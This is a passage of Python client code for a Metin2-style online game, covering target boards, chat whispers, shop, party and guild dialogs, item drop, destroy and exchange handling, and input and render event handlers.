			def SetHPTargetBoard(self, vid, hpPercentage, bElement):
				if vid != self.targetBoard.GetTargetVID():
					self.targetBoard.ResetTargetBoard()
					self.targetBoard.SetEnemyVID(vid)
				
				self.targetBoard.SetHP(hpPercentage)
				self.targetBoard.SetElementImage(bElement)
				self.targetBoard.Show()
		else:
			def SetHPTargetBoard(self, vid, hpPercentage):
				if vid != self.targetBoard.GetTargetVID():
					self.targetBoard.ResetTargetBoard()
					self.targetBoard.SetEnemyVID(vid)
				
				self.targetBoard.SetHP(hpPercentage)
				self.targetBoard.Show()

	def CloseTargetBoardIfDifferent(self, vid):
		if vid != self.targetBoard.GetTargetVID():
			self.targetBoard.Close()

	def CloseTargetBoard(self):
		self.targetBoard.Close()

	## View Equipment
	def OpenEquipmentDialog(self, vid):
		if app.ENABLE_PVP_ADVANCED:
			constinfo.DUEL_IS_SHOW_EQUIP=0
			constinfo.DUEL_SAVE_VID=vid
		
		ret = self.interface.OpenEquipmentDialog(vid)
		ret.SetParent(self.wndDuelGui)
		ret.SetPosition(13, 46)
		(x,y)=self.wndDuelGui.GetGlobalPosition()
		ret.wndCostume.SetPosition(x-130,y)
		self.wndDuelGui.vid=vid
		#ret.wndCostume.SetParent(self.wndDuelGui)

	def SetEquipmentDialogItem(self, vid, slotIndex, vnum, count):
		self.interface.SetEquipmentDialogItem(vid, slotIndex, vnum, count)

	def SetEquipmentDialogSocket(self, vid, slotIndex, socketIndex, value):
		self.interface.SetEquipmentDialogSocket(vid, slotIndex, socketIndex, value)

	def SetEquipmentDialogAttr(self, vid, slotIndex, attrIndex, type, value):
		self.interface.SetEquipmentDialogAttr(vid, slotIndex, attrIndex, type, value)

	def BINARY_OpenAtlasWindow(self):
		self.interface.BINARY_OpenAtlasWindow()

	## Chat
	def OnRecvWhisper(self, mode, name, line):
		if mode == chat.WHISPER_TYPE_GM:
			self.interface.RegisterGameMasterName(name)
		
		chat.AppendWhisper(mode, name, line)
		self.interface.RecvWhisper(name)

	def OnRecvWhisperSystemMessage(self, mode, name, line):
		chat.AppendWhisper(chat.WHISPER_TYPE_SYSTEM, name, line)
		self.interface.RecvWhisper(name)

	def OnRecvWhisperError(self, mode, name, line):
		if localeinfo.WHISPER_ERROR.has_key(mode):
			chat.AppendWhisper(chat.WHISPER_TYPE_SYSTEM, name, localeinfo.WHISPER_ERROR[mode](name))
		else:
			chat.AppendWhisper(chat.WHISPER_TYPE_SYSTEM, name, "Whisper Unknown Error(mode=%d, name=%s)" % (mode, name))
		
		self.interface.RecvWhisper(name)

	def RecvWhisper(self, name):
		self.interface.RecvWhisper(name)

	def OnShopError(self, type):
		try:
			self.PopupMessage(localeinfo.SHOP_ERROR_DICT[type])
		except KeyError:
			self.PopupMessage(localeinfo.SHOP_ERROR_UNKNOWN % (type))

	def OnSafeBoxError(self):
		self.PopupMessage(localeinfo.SAFEBOX_ERROR)

	def OnFishingSuccess(self, isFish, fishName):
		chat.AppendChatWithDelay(chat.CHAT_TYPE_INFO, localeinfo.FISHING_SUCCESS(isFish, fishName), 2000)

	# ADD_FISHING_MESSAGE
	def OnFishingNotifyUnknown(self):
		chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.FISHING_UNKNOWN)

	def OnFishingWrongPlace(self):
		chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.FISHING_WRONG_PLACE)
	# END_OF_ADD_FISHING_MESSAGE

	def OnFishingNotify(self, isFish, fishName):
		chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.FISHING_NOTIFY(isFish, fishName))

	def OnFishingFailure(self):
		chat.AppendChatWithDelay(chat.CHAT_TYPE_INFO, localeinfo.FISHING_FAILURE, 2000)

	def OnCannotPickItem(self):
		chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.GAME_CANNOT_PICK_ITEM)

	# MINING
	def OnCannotMining(self):
		chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.GAME_CANNOT_MINING)
	# END_OF_MINING

	def OnCannotUseSkill(self, vid, type):
		if localeinfo.USE_SKILL_ERROR_TAIL_DICT.has_key(type):
			textTail.RegisterInfoTail(vid, localeinfo.USE_SKILL_ERROR_TAIL_DICT[type])

		if localeinfo.USE_SKILL_ERROR_CHAT_DICT.has_key(type):
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.USE_SKILL_ERROR_CHAT_DICT[type])

	def	OnCannotShotError(self, vid, type):
		textTail.RegisterInfoTail(vid, localeinfo.SHOT_ERROR_TAIL_DICT.get(type, localeinfo.SHOT_ERROR_UNKNOWN % (type)))

	## Shop
	def StartShop(self, vid):
		self.interface.OpenShopDialog(vid)

	def EndShop(self):
		self.interface.CloseShopDialog()

	def RefreshShop(self):
		self.interface.RefreshShopDialog()

	def SetShopSellingPrice(self, Price):
		pass

	## Exchange
	def StartExchange(self):
		self.interface.StartExchange()

	def EndExchange(self):
		self.interface.EndExchange()

	def RefreshExchange(self):
		self.interface.RefreshExchange()

	## Party
	def RecvPartyInviteQuestion(self, leaderVID, leaderName):
		partyInviteQuestionDialog = uicommon.QuestionDialog()
		partyInviteQuestionDialog.SetText(leaderName + localeinfo.PARTY_DO_YOU_JOIN)
		partyInviteQuestionDialog.SetAcceptEvent(lambda arg=True: self.AnswerPartyInvite(arg))
		partyInviteQuestionDialog.SetCancelEvent(lambda arg=False: self.AnswerPartyInvite(arg))
		partyInviteQuestionDialog.Open()
		partyInviteQuestionDialog.partyLeaderVID = leaderVID
		self.partyInviteQuestionDialog = partyInviteQuestionDialog

	def AnswerPartyInvite(self, answer):

		if not self.partyInviteQuestionDialog:
			return

		partyLeaderVID = self.partyInviteQuestionDialog.partyLeaderVID

		distance = player.GetCharacterDistance(partyLeaderVID)
		if distance < 0.0 or distance > 5000:
			answer = False

		net.SendPartyInviteAnswerPacket(partyLeaderVID, answer)

		self.partyInviteQuestionDialog.Close()
		self.partyInviteQuestionDialog = None

	def AddPartyMember(self, pid, name):
		self.interface.AddPartyMember(pid, name)

	def UpdatePartyMemberInfo(self, pid):
		self.interface.UpdatePartyMemberInfo(pid)

	def RemovePartyMember(self, pid):
		self.interface.RemovePartyMember(pid)
		self.__RefreshTargetBoard()

	def LinkPartyMember(self, pid, vid):
		self.interface.LinkPartyMember(pid, vid)

	def UnlinkPartyMember(self, pid):
		self.interface.UnlinkPartyMember(pid)

	def UnlinkAllPartyMember(self):
		self.interface.UnlinkAllPartyMember()

	def ExitParty(self):
		self.interface.ExitParty()
		self.RefreshTargetBoardByVID(self.targetBoard.GetTargetVID())

	def ChangePartyParameter(self, distributionMode):
		self.interface.ChangePartyParameter(distributionMode)

	## Messenger
	def OnMessengerAddFriendQuestion(self, name):
		messengerAddFriendQuestion = uicommon.QuestionDialog2()
		messengerAddFriendQuestion.SetText1(localeinfo.MESSENGER_DO_YOU_ACCEPT_ADD_FRIEND_1 % (name))
		messengerAddFriendQuestion.SetText2(localeinfo.MESSENGER_DO_YOU_ACCEPT_ADD_FRIEND_2)
		messengerAddFriendQuestion.SetAcceptEvent(ui.__mem_func__(self.OnAcceptAddFriend))
		messengerAddFriendQuestion.SetCancelEvent(ui.__mem_func__(self.OnDenyAddFriend))
		messengerAddFriendQuestion.Open()
		messengerAddFriendQuestion.name = name
		self.messengerAddFriendQuestion = messengerAddFriendQuestion

	def OnAcceptAddFriend(self):
		name = self.messengerAddFriendQuestion.name
		net.SendChatPacket("/messenger_auth y " + name)
		self.OnCloseAddFriendQuestionDialog()
		return True

	def OnDenyAddFriend(self):
		name = self.messengerAddFriendQuestion.name
		net.SendChatPacket("/messenger_auth n " + name)
		self.OnCloseAddFriendQuestionDialog()
		return True

	def OnCloseAddFriendQuestionDialog(self):
		self.messengerAddFriendQuestion.Close()
		self.messengerAddFriendQuestion = None
		return True

	## SafeBox
	def OpenSafeboxWindow(self, size):
		self.interface.OpenSafeboxWindow(size)

	def RefreshSafebox(self):
		self.interface.RefreshSafebox()

	def RefreshSafeboxMoney(self):
		self.interface.RefreshSafeboxMoney()

	# ITEM_MALL
	def OpenMallWindow(self, size):
		self.interface.OpenMallWindow(size)

	def RefreshMall(self):
		self.interface.RefreshMall()
	# END_OF_ITEM_MALL

	## Guild
	def RecvGuildInviteQuestion(self, guildID, guildName):
		guildInviteQuestionDialog = uicommon.QuestionDialog()
		guildInviteQuestionDialog.SetText(guildName + localeinfo.GUILD_DO_YOU_JOIN)
		guildInviteQuestionDialog.SetAcceptEvent(lambda arg=True: self.AnswerGuildInvite(arg))
		guildInviteQuestionDialog.SetCancelEvent(lambda arg=False: self.AnswerGuildInvite(arg))
		guildInviteQuestionDialog.Open()
		guildInviteQuestionDialog.guildID = guildID
		self.guildInviteQuestionDialog = guildInviteQuestionDialog

	def AnswerGuildInvite(self, answer):

		if not self.guildInviteQuestionDialog:
			return

		guildLeaderVID = self.guildInviteQuestionDialog.guildID
		net.SendGuildInviteAnswerPacket(guildLeaderVID, answer)

		self.guildInviteQuestionDialog.Close()
		self.guildInviteQuestionDialog = None


	def DeleteGuild(self):
		self.interface.DeleteGuild()

	## Clock
	def ShowClock(self, second):
		self.interface.ShowClock(second)

	def HideClock(self):
		self.interface.HideClock()

	## emotion
	def BINARY_ActEmotion(self, emotionIndex):
		if self.interface.wndCharacter:
			self.interface.wndCharacter.ActEmotion(emotionIndex)

	###############################################################################################
	###############################################################################################
	## Keyboard Functions

	def CheckFocus(self):
		if False == self.IsFocus():
			if True == self.interface.IsOpenChat():
				self.interface.ToggleChat()

			self.SetFocus()

	def SaveScreen(self):
		if not os.path.exists(os.getcwd()+os.sep+"screenshot"):
			os.mkdir(os.getcwd()+os.sep+"screenshot")
			
		(succeeded, name) = grp.SaveScreenShotToPath(os.getcwd()+os.sep+"screenshot"+os.sep)
		if not succeeded:
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.SCREENSHOT_SAVE_FAILURE)

	def ShowName(self):
		self.ShowNameFlag = True

		self.playerGauge.EnableShowAlways()
		player.SetQuickPage(self.quickSlotPageIndex+1)

	# ADD_ALWAYS_SHOW_NAME
	def __IsShowName(self):

		if systemSetting.IsAlwaysShowName():
			return True

		if self.ShowNameFlag:
			return True

		return False
	# END_OF_ADD_ALWAYS_SHOW_NAME

	def HideName(self):
		self.ShowNameFlag = False
		self.playerGauge.DisableShowAlways()
		player.SetQuickPage(self.quickSlotPageIndex)

	def ShowMouseImage(self):
		self.interface.ShowMouseImage()

	def HideMouseImage(self):
		self.interface.HideMouseImage()

	def StartAttack(self):
		player.SetAttackKeyState(True)

	def EndAttack(self):
		player.SetAttackKeyState(False)

	def MoveUp(self):
		player.SetSingleDIKKeyState(app.DIK_UP, True)

	def MoveDown(self):
		player.SetSingleDIKKeyState(app.DIK_DOWN, True)

	def MoveLeftAlt(self):
		if app.USE_AUTO_HUNT and (app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL)):
			self.interface.ToggleAutoWindow()
			return

		player.SetSingleDIKKeyState(app.DIK_LEFT, True)

	def MoveLeft(self):
		player.SetSingleDIKKeyState(app.DIK_LEFT, True)

	def MoveRight(self):
		player.SetSingleDIKKeyState(app.DIK_RIGHT, True)

	def StopUp(self):
		player.SetSingleDIKKeyState(app.DIK_UP, False)

	def StopDown(self):
		player.SetSingleDIKKeyState(app.DIK_DOWN, False)

	def StopLeft(self):
		player.SetSingleDIKKeyState(app.DIK_LEFT, False)

	def StopRight(self):
		player.SetSingleDIKKeyState(app.DIK_RIGHT, False)

	def PickUpItem(self):
		player.PickCloseItem()

	#def PickUpMoney(self):
	#	player.PickCloseMoney()

	###############################################################################################
	###############################################################################################
	## Event Handler

	def OnKeyDown(self, key):
		if key == app.DIK_ESC:
			self.RequestDropItem(False)
		
		try:
			self.onPressKeyDict[key]()
		except KeyError:
			pass
		except:
			raise
		
		return True

	def OnKeyUp(self, key):
		if key == None:
			return
		
		try:
			self.onClickKeyDict[key]()
		except:
			pass
		
		return True

	def OnMouseLeftButtonDown(self):
		if self.interface.BUILD_OnMouseLeftButtonDown():
			return

		if mousemodule.mouseController.isAttached():
			self.CheckFocus()
		else:
			hyperlink = ui.GetHyperlink()
			if hyperlink:
				return
			else:
				self.CheckFocus()
				player.SetMouseState(player.MBT_LEFT, player.MBS_PRESS);

		return True

	def OnMouseLeftButtonUp(self):

		if self.interface.BUILD_OnMouseLeftButtonUp():
			return

		if mousemodule.mouseController.isAttached():
			attachedType = mousemodule.mouseController.GetAttachedType()
			attachedItemSlotPos = mousemodule.mouseController.GetAttachedSlotNumber()

			if app.USE_AUTO_HUNT and attachedType == player.SLOT_TYPE_AUTO:
				self.interface.AutoHuntCheckOut(attachedItemSlotPos)
				return

			attachedItemIndex = mousemodule.mouseController.GetAttachedItemIndex()
			attachedItemCount = mousemodule.mouseController.GetAttachedItemCount()
			if app.__ENABLE_NEW_OFFLINESHOP__:
				if uiofflineshop.IsBuildingShop() and uiofflineshop.IsSaleSlot(player.SlotTypeToInvenType(attachedType), attachedItemSlotPos): #toupdate
					chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.OFFLINESHOP_CANT_SELECT_ITEM_DURING_BUILING)
					return



			## QuickSlot
			if player.SLOT_TYPE_QUICK_SLOT == attachedType:
				player.RequestDeleteGlobalQuickSlot(attachedItemSlotPos)
			elif app.ENABLE_AURA_SYSTEM and player.SLOT_TYPE_AURA == attachedType:
				self.__PutItem(attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount, self.PickingCharacterIndex)
			## Inventory
			elif player.SLOT_TYPE_INVENTORY == attachedType:

				if player.ITEM_MONEY == attachedItemIndex:
					self.__PutMoney(attachedType, attachedItemCount, self.PickingCharacterIndex)
				else:
					self.__PutItem(attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount, self.PickingCharacterIndex)

			## DragonSoul
			elif player.SLOT_TYPE_DRAGON_SOUL_INVENTORY == attachedType:
				self.__PutItem(attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount, self.PickingCharacterIndex)


			## ExtraInventory
			if app.ENABLE_EXTRA_INVENTORY:
				if attachedType == player.SLOT_TYPE_EXTRA_INVENTORY:
					self.__PutItem(attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount, self.PickingCharacterIndex)



			mousemodule.mouseController.DeattachObject()

		else:
			hyperlink = ui.GetHyperlink()
			if hyperlink:
				if app.IsPressed(app.DIK_LALT):
					link = chat.GetLinkFromHyperlink(hyperlink)
					ime.PasteString(link)
				else:
					self.interface.MakeHyperlinkTooltip(hyperlink)
				return
			else:
				player.SetMouseState(player.MBT_LEFT, player.MBS_CLICK)

		#player.EndMouseWalking()
		return True

	def __PutItem(self, attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount, dstChrID):
		if app.ENABLE_EXTRA_INVENTORY:
			if player.SLOT_TYPE_INVENTORY == attachedType or player.SLOT_TYPE_DRAGON_SOUL_INVENTORY == attachedType or player.SLOT_TYPE_EXTRA_INVENTORY == attachedType:
				attachedInvenType = player.SlotTypeToInvenType(attachedType)
				if True == chr.HasInstance(self.PickingCharacterIndex) and player.GetMainCharacterIndex() != dstChrID:
					if player.IsEquipmentSlot(attachedItemSlotPos) and player.SLOT_TYPE_DRAGON_SOUL_INVENTORY != attachedType and player.SLOT_TYPE_EXTRA_INVENTORY != attachedType:
						self.stream.popupWindow.Close()
						self.stream.popupWindow.Open(localeinfo.EXCHANGE_FAILURE_EQUIP_ITEM, 0, localeinfo.UI_OK)
					else:
						if chr.IsNPC(dstChrID):
							if app.USE_AUTO_REFINE:
								constinfo.AUTO_REFINE_TYPE = 2
								constinfo.AUTO_REFINE_DATA["NPC"][0] = dstChrID
								constinfo.AUTO_REFINE_DATA["NPC"][1] = attachedInvenType
								constinfo.AUTO_REFINE_DATA["NPC"][2] = attachedItemSlotPos
								constinfo.AUTO_REFINE_DATA["NPC"][3] = attachedItemCount
							
							net.SendGiveItemPacket(dstChrID, attachedInvenType, attachedItemSlotPos, attachedItemCount)
						else:
							if app.ENABLE_MELEY_LAIR_DUNGEON:
								if chr.IsStone(dstChrID):
									net.SendGiveItemPacket(dstChrID, attachedInvenType, attachedItemSlotPos, attachedItemCount)
								else:
									net.SendExchangeStartPacket(dstChrID)
									net.SendExchangeItemAddPacket(attachedInvenType, attachedItemSlotPos, 0)
							else:
								net.SendExchangeStartPacket(dstChrID)
								net.SendExchangeItemAddPacket(attachedInvenType, attachedItemSlotPos, 0)
				else:
					self.__DropItem(attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount)
		else:
			if player.SLOT_TYPE_INVENTORY == attachedType or player.SLOT_TYPE_DRAGON_SOUL_INVENTORY == attachedType:
				attachedInvenType = player.SlotTypeToInvenType(attachedType)
				if True == chr.HasInstance(self.PickingCharacterIndex) and player.GetMainCharacterIndex() != dstChrID:
					if player.IsEquipmentSlot(attachedItemSlotPos) and player.SLOT_TYPE_DRAGON_SOUL_INVENTORY != attachedType:
						self.stream.popupWindow.Close()
						self.stream.popupWindow.Open(localeinfo.EXCHANGE_FAILURE_EQUIP_ITEM, 0, localeinfo.UI_OK)
					else:
						if chr.IsNPC(dstChrID):
							if app.USE_AUTO_REFINE:
								constinfo.AUTO_REFINE_TYPE = 2
								constinfo.AUTO_REFINE_DATA["NPC"][0] = dstChrID
								constinfo.AUTO_REFINE_DATA["NPC"][1] = attachedInvenType
								constinfo.AUTO_REFINE_DATA["NPC"][2] = attachedItemSlotPos
								constinfo.AUTO_REFINE_DATA["NPC"][3] = attachedItemCount
							
							net.SendGiveItemPacket(dstChrID, attachedInvenType, attachedItemSlotPos, attachedItemCount)
						else:
							if app.ENABLE_MELEY_LAIR_DUNGEON:
								if chr.IsStone(dstChrID):
									net.SendGiveItemPacket(dstChrID, attachedInvenType, attachedItemSlotPos, attachedItemCount)
								else:
									net.SendExchangeStartPacket(dstChrID)
									net.SendExchangeItemAddPacket(attachedInvenType, attachedItemSlotPos, 0)
							else:
								net.SendExchangeStartPacket(dstChrID)
								net.SendExchangeItemAddPacket(attachedInvenType, attachedItemSlotPos, 0)
				else:
					self.__DropItem(attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount)
		
		if app.ENABLE_AURA_SYSTEM and player.SLOT_TYPE_AURA == attachedType:
			self.__DropItem(attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount)

	def __PutMoney(self, attachedType, attachedMoney, dstChrID):
		if True == chr.HasInstance(dstChrID) and player.GetMainCharacterIndex() != dstChrID:
			net.SendExchangeStartPacket(dstChrID)
			net.SendExchangeElkAddPacket(attachedMoney)

	def __SendDestroyItemPacket(self, itemVNum, itemInvenType = player.INVENTORY):
		if uiprivateshopbuilder.IsBuildingPrivateShop():
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.DROP_ITEM_FAILURE_PRIVATE_SHOP)
			return
		
		net.SendItemDestroyPacket(itemVNum, itemInvenType)

	def AnswerDestroyItem(self, answer):
		if not self.itemDropQuestionDialog or not self.itemDestroyQuestionDialog:
			return
		
		if uiprivateshopbuilder.IsBuildingPrivateShop():
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.DROP_ITEM_FAILURE_PRIVATE_SHOP)
			return
		
		if answer:
			dropType = self.itemDropQuestionDialog.dropType
			dropNumber = self.itemDropQuestionDialog.dropNumber
			
			dropItemIndex = player.GetItemIndex(dropType, dropNumber)
			if not dropItemIndex:
				return
			
			if dropType == player.INVENTORY and dropItemIndex == player.ITEM_MONEY:
				return
			
			net.SendItemDestroyPacket(dropNumber, dropType)
		
		self.itemDestroyQuestionDialog.Close()
		self.itemDestroyQuestionDialog = None
		
		if answer:
			self.itemDropQuestionDialog.Close()
			self.itemDropQuestionDialog = None
		
		constinfo.SET_ITEM_QUESTION_DIALOG_STATUS(0)

	def RequestDestroyItem(self):
		if not self.itemDropQuestionDialog:
			return
		
		if self.itemDestroyQuestionDialog:
			self.itemDestroyQuestionDialog.Close()
			self.itemDestroyQuestionDialog = None
		
		dropType = self.itemDropQuestionDialog.dropType
		dropNumber = self.itemDropQuestionDialog.dropNumber
		
		dropItemIndex = player.GetItemIndex(dropType, dropNumber)
		if not dropItemIndex:
			return
		
		item.SelectItem(dropItemIndex)
		
		itemDestroyQuestionDialog = uicommon.QuestionDialog()
		itemDestroyQuestionDialog.SetText(localeinfo.CONFIRM_ITEM_DESTROY % (self.itemDropQuestionDialog.dropCount, item.GetItemName()))
		itemDestroyQuestionDialog.SetAcceptEvent(lambda arg = True: self.AnswerDestroyItem(arg))
		itemDestroyQuestionDialog.SetCancelEvent(lambda arg = False: self.AnswerDestroyItem(arg))
		itemDestroyQuestionDialog.Open()
		itemDestroyQuestionDialog.dropType = self.itemDropQuestionDialog.dropType
		itemDestroyQuestionDialog.dropNumber = self.itemDropQuestionDialog.dropNumber
		itemDestroyQuestionDialog.dropCount = self.itemDropQuestionDialog.dropCount
		self.itemDestroyQuestionDialog = itemDestroyQuestionDialog

	def __DropItem(self, attachedType, attachedItemIndex, attachedItemSlotPos, attachedItemCount):
		if uiprivateshopbuilder.IsBuildingPrivateShop():
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.DROP_ITEM_FAILURE_PRIVATE_SHOP)
			return
		
		if player.SLOT_TYPE_INVENTORY == attachedType and player.IsEquipmentSlot(attachedItemSlotPos):
			self.stream.popupWindow.Close()
			self.stream.popupWindow.Open(localeinfo.DROP_ITEM_FAILURE_EQUIP_ITEM, 0, localeinfo.UI_OK)
		else:
			if attachedType == player.SLOT_TYPE_INVENTORY or\
			attachedType == player.SLOT_TYPE_DRAGON_SOUL_INVENTORY or\
			(app.ENABLE_EXTRA_INVENTORY and player.SLOT_TYPE_EXTRA_INVENTORY == attachedType):
				if attachedType == player.SLOT_TYPE_INVENTORY:
					windowType = player.INVENTORY
				elif attachedType == player.SLOT_TYPE_DRAGON_SOUL_INVENTORY:
					windowType = player.DRAGON_SOUL_INVENTORY
				elif attachedType == player.SLOT_TYPE_EXTRA_INVENTORY:
					windowType = player.EXTRA_INVENTORY
				
				dropItemIndex = player.GetItemIndex(windowType, attachedItemSlotPos)
				if not dropItemIndex:
					return
				
				item.SelectItem(dropItemIndex)
				dropItemName = item.GetItemName()
				
				questionText = localeinfo.WHAT_YOU_WANT_TODO % (attachedItemCount, dropItemName)
				
				itemDropQuestionDialog = uicommon.QuestionDropDialog()
				itemDropQuestionDialog.SetText(questionText)
				itemDropQuestionDialog.SetAcceptEvent(lambda arg=True: self.RequestDropItem(arg))
				itemDropQuestionDialog.SetDestroyEvent(ui.__mem_func__(self.RequestDestroyItem))
				itemDropQuestionDialog.SetExchangeEvent(ui.__mem_func__(self.RequestExchangeItem))
				itemDropQuestionDialog.SetCancelEvent(lambda arg=False: self.RequestDropItem(arg))
				
				itemDropQuestionDialog.dropType = windowType
				itemDropQuestionDialog.dropNumber = attachedItemSlotPos
				itemDropQuestionDialog.dropCount = attachedItemCount
				itemDropQuestionDialog.Open()
				self.itemDropQuestionDialog = itemDropQuestionDialog
				
				constinfo.SET_ITEM_QUESTION_DIALOG_STATUS(1)
		
		if app.ENABLE_AURA_SYSTEM and player.SLOT_TYPE_AURA == attachedType:
			net.SendAuraRefineCheckOut(attachedItemSlotPos, player.GetAuraRefineWindowType())

	def AnswerExchangeItem(self, answer):
		if not self.itemDropQuestionDialog or not self.itemDestroyQuestionDialog:
			return
		
		if uiprivateshopbuilder.IsBuildingPrivateShop():
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.DROP_ITEM_FAILURE_PRIVATE_SHOP)
			return
		
		if answer:
			dropType = self.itemDropQuestionDialog.dropType
			dropNumber = self.itemDropQuestionDialog.dropNumber
			
			dropItemIndex = player.GetItemIndex(dropType, dropNumber)
			if not dropItemIndex:
				return
			
			if dropType == player.INVENTORY and dropItemIndex == player.ITEM_MONEY:
				return
			
			if app.ENABLE_EXCHANGE_FRAGMENTS:
				net.ajf34iuhfs55539141(dropType, dropNumber)
		
		self.itemDestroyQuestionDialog.Close()
		self.itemDestroyQuestionDialog = None
		
		if answer:
			self.itemDropQuestionDialog.Close()
			self.itemDropQuestionDialog = None
		
		constinfo.SET_ITEM_QUESTION_DIALOG_STATUS(0)

	def RequestExchangeItem(self):
		if not self.itemDropQuestionDialog:
			return
		
		if self.itemDestroyQuestionDialog:
			self.itemDestroyQuestionDialog.Close()
			self.itemDestroyQuestionDialog = None
		
		dropType = self.itemDropQuestionDialog.dropType
		dropNumber = self.itemDropQuestionDialog.dropNumber
		
		dropItemIndex = player.GetItemIndex(dropType, dropNumber)
		if not dropItemIndex:
			return
		
		item.SelectItem(dropItemIndex)
		itemType = item.GetItemType()
		
		dropItemCount = player.GetItemCount(dropType, dropNumber)
		itemDestroyQuestionDialog = uicommon.QuestionDialog()
		count = 0
		if itemType == item.ITEM_TYPE_METIN:
			count = item.GetValue(0) * dropItemCount
		
		itemDestroyQuestionDialog.SetText(localeinfo.CONFIRM_ITEM_EXCHANGE % (count))
		itemDestroyQuestionDialog.SetAcceptEvent(lambda arg = True: self.AnswerExchangeItem(arg))
		itemDestroyQuestionDialog.SetCancelEvent(lambda arg = False: self.AnswerExchangeItem(arg))
		itemDestroyQuestionDialog.Open()
		itemDestroyQuestionDialog.dropType = self.itemDropQuestionDialog.dropType
		itemDestroyQuestionDialog.dropNumber = self.itemDropQuestionDialog.dropNumber
		itemDestroyQuestionDialog.dropCount = self.itemDropQuestionDialog.dropCount
		self.itemDestroyQuestionDialog = itemDestroyQuestionDialog

	def RequestDropItem(self, answer):
		if not self.itemDropQuestionDialog:
			return
		
		if uiprivateshopbuilder.IsBuildingPrivateShop():
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.DROP_ITEM_FAILURE_PRIVATE_SHOP)
			return
		
		if answer:
			dropType = self.itemDropQuestionDialog.dropType
			dropCount = self.itemDropQuestionDialog.dropCount
			dropNumber = self.itemDropQuestionDialog.dropNumber
			
			dropItemIndex = player.GetItemIndex(dropType, dropNumber)
			if not dropItemIndex:
				return
			
			if dropType == player.INVENTORY and dropItemIndex == player.ITEM_MONEY:
				return
			
			net.SendItemDropPacketNew(dropType, dropNumber, dropCount)
		
		self.itemDropQuestionDialog.Close()
		self.itemDropQuestionDialog = None
		
		constinfo.SET_ITEM_QUESTION_DIALOG_STATUS(0)

	# PRIVATESHOP_DISABLE_ITEM_DROP
	def __SendDropItemPacket(self, itemVNum, itemCount, itemInvenType = player.INVENTORY):
		if uiprivateshopbuilder.IsBuildingPrivateShop():
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.DROP_ITEM_FAILURE_PRIVATE_SHOP)
			return

		net.SendItemDropPacketNew(itemInvenType, itemVNum, itemCount)
	# END_OF_PRIVATESHOP_DISABLE_ITEM_DROP

	def OnMouseRightButtonDown(self):

		self.CheckFocus()

		if True == mousemodule.mouseController.isAttached():
			mousemodule.mouseController.DeattachObject()

		else:
			player.SetMouseState(player.MBT_RIGHT, player.MBS_PRESS)

		return True

	def OnMouseRightButtonUp(self):
		if True == mousemodule.mouseController.isAttached():
			return True

		player.SetMouseState(player.MBT_RIGHT, player.MBS_CLICK)
		return True

	def OnMouseMiddleButtonDown(self):
		player.SetMouseMiddleButtonState(player.MBS_PRESS)

	def OnMouseMiddleButtonUp(self):
		player.SetMouseMiddleButtonState(player.MBS_CLICK)

	def OnUpdate(self):
		app.UpdateGame()
		# gamemasta = player.GetName()

		if app.ENABLE_PVP_ADVANCED:
			if constinfo.DUEL_IS_SHOW_EQUIP==1:
				self.interface.CloseEquipmentDialog(int(constinfo.DUEL_SAVE_VID))
		
		if self.enableXMasBoom:
			self.__XMasBoom_Update()
		
		self.interface.BUILD_OnUpdate()
		self.interface.OnAutoSendShout()

		#if 0 == constinfo.auto_pick_yang:
		#	self.PickUpMoney()
		if app.ENABLE_BIOLOGIST_UI:
			if constinfo.haveBiologist == 1:
				t = constinfo.remainBiologistTime - app.GetGlobalTimeStamp()
				if t <= 0:
					if systemSetting.GetBiologistAlert() == True:
						name = player.GetName()
						if not name in constinfo.notifiedBiologist:
							constinfo.notifiedBiologist.append(name)
							if self.biologistAlert and not self.biologistAlert.IsShow():
								self.biologistAlert.Open()

	def OnRender(self):
		app.RenderGame()
		
		(x, y) = app.GetCursorPosition()

		########################
		# Picking
		########################
		textTail.UpdateAllTextTail()

		if True == wndMgr.IsPickedWindow(self.hWnd):

			self.PickingCharacterIndex = chr.Pick()

			if -1 != self.PickingCharacterIndex:
				textTail.ShowCharacterTextTail(self.PickingCharacterIndex)
			if 0 != self.targetBoard.GetTargetVID():
				textTail.ShowCharacterTextTail(self.targetBoard.GetTargetVID())

			# ADD_ALWAYS_SHOW_NAME
			if not self.__IsShowName():
				self.PickingItemIndex = item.Pick()
				if -1 != self.PickingItemIndex:
					textTail.ShowItemTextTail(self.PickingItemIndex)
			# END_OF_ADD_ALWAYS_SHOW_NAME

		## Show all name in the range

		# ADD_ALWAYS_SHOW_NAME
		if self.__IsShowName():
			textTail.ShowAllTextTail()
			self.PickingItemIndex = textTail.Pick(x, y)
		# END_OF_ADD_ALWAYS_SHOW_NAME

		textTail.UpdateShowingTextTail()
		textTail.ArrangeTextTail()
		if -1 != self.PickingItemIndex:
			textTail.SelectItemName(self.PickingItemIndex)

		grp.PopState()
		grp.SetInterfaceRenderState()

		textTail.Render()
		textTail.HideAllTextTail()

	def OnPressEscapeKey(self):
		if app.TARGET == app.GetCursor():
			app.SetCursor(app.NORMAL)

		elif True == mousemodule.mouseController.isAttached():
			mousemodule.mouseController.DeattachObject()

		else:
			self.interface.OpenSystemDialog()

		return True

	def OnIMEReturn(self):
		if app.IsPressed(app.DIK_LSHIFT):
			self.interface.OpenWhisperDialogWithoutTarget()
		else:
			self.interface.ToggleChat()
